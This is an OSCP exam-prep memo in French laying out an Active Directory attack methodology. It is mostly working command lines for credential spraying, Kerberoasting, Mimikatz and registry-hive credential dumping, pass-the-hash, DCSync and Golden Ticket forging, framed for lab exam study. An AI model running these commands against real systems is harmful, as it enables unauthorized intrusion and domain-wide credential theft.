
# Memo AD OSCP — Assumed Breach

  

> Contexte : tu reçois `user:password` + un range IP. Objectif : Domain Admin.

  

---

  

## PHASE 0 — Setup (5 min max)

  

```bash

# Variables à définir dès le début — te fera gagner un temps fou

export USER='john.doe'

export PASS='Passw0rd!'

export DOMAIN='corp.local'

export DC_IP='10.10.10.10'

export TARGET='10.10.10.0/24'

  

# Sync l'heure avec le DC (sinon Kerberos casse)

sudo ntpdate $DC_IP

# ou

sudo rdate -n $DC_IP
  

# Ajoute le domaine dans /etc/hosts

echo "$DC_IP dc01.$DOMAIN $DOMAIN" | sudo tee -a /etc/hosts

```

  

---

  

## PHASE 1 — Checklist "je viens d'arriver dans le réseau"

  

**Fais tout ça AVANT de te lancer dans une attaque précise.**

  

### 1.1 — Découverte réseau

```bash

# Ping sweep rapide

nxc smb $TARGET

# Ou nmap discovery

nmap -sn $TARGET -oA hosts

  

# Scan ports classique sur ce que tu trouves

nmap -sC -sV -p- --min-rate=1000 <ip> -oA scan_<ip>

```

  

### 1.2 — Identifier le DC

```bash

# nxc te dit tout : nom, domaine, OS, signing

nxc smb $TARGET

# Cherche "DC" ou "Domain Controller" dans le hostname

nslookup -type=SRV _ldap._tcp.dc._msdcs.$DOMAIN $DC_IP

```

  

### 1.3 — Valider les creds partout

```bash

# Test les creds sur TOUT le range — mine d'or

nxc smb $TARGET -u $USER -p $PASS

nxc smb $TARGET -u $USER -p $PASS --shares      # shares accessibles ?

nxc winrm $TARGET -u $USER -p $PASS             # WinRM ouvert ?

nxc mssql $TARGET -u $USER -p $PASS             # SQL ?

nxc ldap $TARGET -u $USER -p $PASS              # LDAP bind ?

nxc rdp $TARGET -u $USER -p $PASS               # RDP ?

```

  

Symboles à repérer dans nxc :

- `[+]` = auth OK

- `(Pwn3d!)` = **admin local** → jackpot potentiel

- `[-]` STATUS_ACCESS_DENIED = user valide mais pas les droits

  

### 1.4 — Enum utilisateurs, groupes, ordinateurs

```bash

# Liste tous les users du domaine

nxc smb $DC_IP -u $USER -p $PASS --users

# Liste les groupes

nxc smb $DC_IP -u $USER -p $PASS --groups

# Liste les machines

nxc smb $DC_IP -u $USER -p $PASS --computers

# Politique de mot de passe (pour éviter le lockout !)

nxc smb $DC_IP -u $USER -p $PASS --pass-pol

# Loggés actuellement

nxc smb $TARGET -u $USER -p $PASS --loggedon-users

# Sessions

nxc smb $TARGET -u $USER -p $PASS --sessions

```

  

### 1.5 — Récupère la liste des users dans un fichier (pour spray/roast)

```bash

nxc smb $DC_IP -u $USER -p $PASS --users | awk '{print $5}' | tail -n +5 > users.txt

```

  

### 1.6 — SMB shares : cherche des credentials dans les fichiers

```bash

# Liste les shares accessibles

smbclient -L //$DC_IP -U "$USER%$PASS"

  

# Spider les shares (gold mine, souvent oublié)

nxc smb $TARGET -u $USER -p $PASS -M spider_plus

  

# Cherche des mots-clés dans les shares

nxc smb $TARGET -u $USER -p $PASS -M spider_plus -o EXTENSIONS=xml,ini,txt,config,ps1,bat

```

  

Cherche dedans : `password`, `pwd`, `pass`, `cred`, `unattend.xml`, `sysprep.inf`, `web.config`, `.ps1`, `.bat`, `Groups.xml` (GPP).

  

### 1.7 — Lance BloodHound EN PARALLÈLE

```bash

# Collection à distance (Linux)

bloodhound-python -u $USER -p $PASS -d $DOMAIN -dc dc01.$DOMAIN -c All --zip -ns $DC_IP

# Puis importe dans BloodHound / BloodHound CE

neo4j start

bloodhound

```

  

**Queries à lancer directement dans BloodHound :**

- Shortest Paths to Domain Admins

- Shortest Paths from Owned (marque ton user comme "owned" d'abord)

- Kerberoastable Users

- AS-REP Roastable Users

- Find All Users with a Description (mdp souvent dedans)

- Find Computers with Unconstrained Delegation

  

---

  

## PHASE 2 — Arbre de décision "j'ai des creds, et maintenant ?"

  

```

J'ai user:password

│

├─ nxc dit (Pwn3d!) quelque part ?

│   └─ OUI → dump SAM/LSA sur cette machine

│            → nxc smb <ip> -u X -p Y --sam --lsa --ntds

│            → hash local admin réutilisable ? → Pass-the-Hash sur autres machines

│

├─ Le user est-il dans un groupe intéressant ? (BloodHound)

│   ├─ Domain Admins → tu as gagné

│   ├─ Account Operators / Backup Operators / Server Operators → chemin direct DA

│   ├─ Remote Management Users → WinRM sur des machines

│   └─ ACL abusable (GenericAll, WriteDACL, ForceChangePassword) → exploit

│

├─ Un chemin BloodHound existe ?

│   └─ Suis-le. C'est souvent la solution de l'exam.

│

├─ Users kerberoastables ? (SPN set)

│   └─ Kerberoasting → crack hash → nouveau compte

│       GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request

│

├─ Users AS-REP roastables ? (DONT_REQ_PREAUTH)

│   └─ AS-REP Roasting → crack → nouveau compte

│       GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP

│

├─ Password reuse ? Password spray light ?

│   └─ ATTENTION lockout policy !

│       nxc smb $TARGET -u users.txt -p 'Winter2025!' --continue-on-success

│

├─ MSSQL accessible ?

│   └─ xp_cmdshell / linked servers / UNC path coercion

│

├─ Une machine avec Unconstrained Delegation ?

│   └─ PrinterBug/PetitPotam → force le DC à s'auth → capture TGT DC$

│

└─ Rien ne marche ?

    ├─ Re-spider les shares avec d'autres extensions

    ├─ Regarde les descriptions des users (nxc --users -v)

    ├─ ldapsearch manuel — parfois BloodHound rate des trucs

    └─ Enum web sur les serveurs (IIS, apps internes)

```

  

---

  

## PHASE 3 — Arbre de décision "j'ai un hash NT ou un ticket"

  

```

Je viens de dump un hash NT (ex: dump SAM, mimikatz, secretsdump)

│

├─ Hash Administrateur local d'une machine ?

│   └─ Essaie-le sur TOUTES les autres machines (password reuse)

│       nxc smb $TARGET -u Administrator -H <hash> --local-auth

│

├─ Hash d'un user de domaine ?

│   ├─ Pass-the-Hash → nxc / psexec / wmiexec / evil-winrm

│   ├─ Overpass-the-Hash → get TGT via getTGT.py, puis Pass-the-Ticket

│   └─ DCSync si le user a les droits (Replicating Directory Changes)

│       secretsdump.py $DOMAIN/$USER@$DC_IP -hashes :<NT>

│

├─ Hash krbtgt ?

│   └─ Golden Ticket → tu es DA pour l'éternité (jusqu'au reset krbtgt x2)

│

└─ Hash d'un compte machine (MACHINE$) ?

    └─ Silver Ticket vers un service de cette machine (CIFS, HOST, HTTP...)

        ou Resource-Based Constrained Delegation

```

  

---

  

## PHASE 4 — Cheatsheet commandes essentielles

  

### Énumération avec creds

  

```bash

# nxc = ton meilleur ami

nxc smb $DC_IP -u $USER -p $PASS --users

nxc smb $DC_IP -u $USER -p $PASS --groups

nxc smb $DC_IP -u $USER -p $PASS --computers

nxc smb $DC_IP -u $USER -p $PASS --pass-pol

nxc smb $DC_IP -u $USER -p $PASS --rid-brute       # si null session

  

# LDAP direct

ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" -b "DC=corp,DC=local"

  

# Enum via RPC (parfois marche quand LDAP filtré)

rpcclient -U "$USER%$PASS" $DC_IP

> enumdomusers

> enumdomgroups

> queryuser <rid>

```

  

### Kerberoasting

  

```bash

# Impacket

GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile kerb.hash

  

# Crack

hashcat -m 13100 kerb.hash /usr/share/wordlists/rockyou.txt

```

  

### AS-REP Roasting

  

```bash

GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC_IP -format hashcat -outputfile asrep.hash

hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt

```

  

### Password Spraying (ATTENTION LOCKOUT)

  

```bash

# Vérifie D'ABORD la politique

nxc smb $DC_IP -u $USER -p $PASS --pass-pol

  

# Spray léger — 1 mdp par user, une fois

nxc smb $DC_IP -u users.txt -p 'Password123!' --continue-on-success

```

  

### Pass-the-Hash

  

```bash

# nxc PtH

nxc smb <ip> -u Administrator -H <NThash> --local-auth

nxc smb <ip> -u domainuser -H <NThash>

  

# Impacket

psexec.py $DOMAIN/user@<ip> -hashes :<NThash>

wmiexec.py $DOMAIN/user@<ip> -hashes :<NThash>

smbexec.py $DOMAIN/user@<ip> -hashes :<NThash>

  

# Evil-WinRM

evil-winrm -i <ip> -u user -H <NThash>

```

  

### Pass-the-Ticket (Overpass-the-Hash)

  

```bash

# 1. Obtenir un TGT à partir du hash

getTGT.py $DOMAIN/$USER -hashes :<NThash> -dc-ip $DC_IP

# → génère user.ccache

  

# 2. Utiliser le ticket

export KRB5CCNAME=$(pwd)/$USER.ccache

psexec.py -k -no-pass $DOMAIN/$USER@target.$DOMAIN

```

  

### DCSync

  

```bash

# Si le compte a les droits de replication

secretsdump.py $DOMAIN/$USER:$PASS@$DC_IP

# ou avec hash

secretsdump.py $DOMAIN/$USER@$DC_IP -hashes :<NThash>

# ou just DA

secretsdump.py -just-dc $DOMAIN/$USER:$PASS@$DC_IP

```

  

### Silver Ticket (une fois qu'on a le hash MACHINE$)

  

```bash

ticketer.py -nthash <machine_hash> -domain-sid <SID> -domain $DOMAIN \

  -spn cifs/target.$DOMAIN Administrator

export KRB5CCNAME=Administrator.ccache

psexec.py -k -no-pass target.$DOMAIN

```

  

### Golden Ticket (une fois krbtgt hash récupéré)

  

```bash

ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain $DOMAIN Administrator

export KRB5CCNAME=Administrator.ccache

psexec.py -k -no-pass -dc-ip $DC_IP $DOMAIN/Administrator@$DC_FQDN

```

  

### Exécution de commandes / shells (side Windows)

  

```bash

# psexec-like — bruyant mais fiable

psexec.py $DOMAIN/$USER:$PASS@<ip>

# wmiexec — plus discret, pas de shell interactif "vrai"

wmiexec.py $DOMAIN/$USER:$PASS@<ip>

# smbexec — quand les autres fail

smbexec.py $DOMAIN/$USER:$PASS@<ip>

# atexec — via tâches planifiées

atexec.py $DOMAIN/$USER:$PASS@<ip> "whoami"

# WinRM (5985/5986)

evil-winrm -i <ip> -u $USER -p $PASS

```

  

### Sur une machine Windows compromise (post-exploit)

  

```powershell

# Info système

whoami /all

whoami /priv                 # cherche SeImpersonate, SeBackup, SeRestore, SeDebug

systeminfo

net user /domain

net group "Domain Admins" /domain

net localgroup Administrators

  

# Dump credentials

# Mimikatz classique

privilege::debug

sekurlsa::logonpasswords

lsadump::sam

lsadump::dcsync /user:krbtgt

  

# Alternatives moins détectées

reg save HKLM\SAM sam.save

reg save HKLM\SYSTEM system.save

reg save HKLM\SECURITY security.save

# → secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

```

  

### Privilege Escalation Windows — les gros classiques

  

```powershell

# Outils auto

winPEAS.exe

Seatbelt.exe -group=all

PowerUp.ps1 → Invoke-AllChecks

  

# Vérifs manuelles rapides

whoami /priv

# → SeImpersonate/SeAssignPrimaryToken → PrintSpoofer / GodPotato / JuicyPotatoNG

# → SeBackup/SeRestore → dump SAM/SYSTEM offline

# → SeDebug → mimikatz sur lsass

  

# Services non quotés / permissions faibles

sc qc <service>

accesschk.exe -uwcqv "Users" *

```

  

---

  

## PHASE 5 — Chemins d'attaque typiques (patterns exam)

  

### Pattern 1 : Kerberoasting → DA

```

creds initiaux → GetUserSPNs → crack SPN account

→ ce compte a des droits sur une machine → PsExec → dump hashes locaux

→ hash admin réutilisé sur DC → DCSync → krbtgt → Golden Ticket

```

  

### Pattern 2 : AS-REP → lateral → DA

```

users.txt → GetNPUsers → crack AS-REP hash → user2

→ user2 dans Remote Management Users → WinRM sur SRV01

→ mimikatz → hash de admin_helpdesk → ce compte DCSync sur DC → gg

```

  

### Pattern 3 : SMB share → creds → escalation

```

spider_plus → trouve creds.txt dans un share dev

→ nouveaux creds → user avec GenericAll sur un groupe

→ ajoute-toi au groupe → droits admin sur SRV02

→ pivote → dump ntds

```

  

### Pattern 4 : ACL abuse (via BloodHound)

```

BloodHound montre : user → ForceChangePassword → user2 (kerberoastable)

→ change le mdp de user2 → kerberoast (déjà crackable mais bon)

→ ou : user → WriteDACL sur groupe → ajoute-toi → hérite des droits

```

  

---

  

## Rappels critiques pour l'exam

  

1. **PRENDS DES SCREENSHOTS DE TOUT.** local.txt, proof.txt, chaque étape clé, chaque commande importante. Pas de screenshot = pas de points.

2. **Note chaque commande exacte** — tu la remettras dans le rapport.

3. **Attention à la password policy** — un lockout et tu es cuit sur l'AD set.

4. **Sync ton temps** avec le DC (Kerberos = ±5min max).

5. **Metasploit = 1 seule machine** pour tout l'exam. Ne le crame pas sur l'AD.

6. **Si tu bloques 45 min sur une piste → change de piste**, reviens plus tard.

7. **BloodHound d'abord**, exploit ensuite. L'exam AD est un jeu de graphe.

8. **local.txt sur chaque machine du set = points partiels** (10 par machine). Prends-les tous, même si tu ne finis pas.

  

---

  

## Outils à avoir installés/à jour

  

```

# Impacket suite (secretsdump, psexec, wmiexec, GetUserSPNs, GetNPUsers, getTGT, ticketer)

pip install impacket

# nxc (successeur de crackmapexec)

pipx install netexec

# bloodhound-python

pip install bloodhound

# BloodHound CE (avec neo4j)

# evil-winrm

gem install evil-winrm

# kerbrute (user enum sans lockout)

# mimikatz, Rubeus, PowerView, SharpHound, winPEAS, PrintSpoofer, GodPotato

```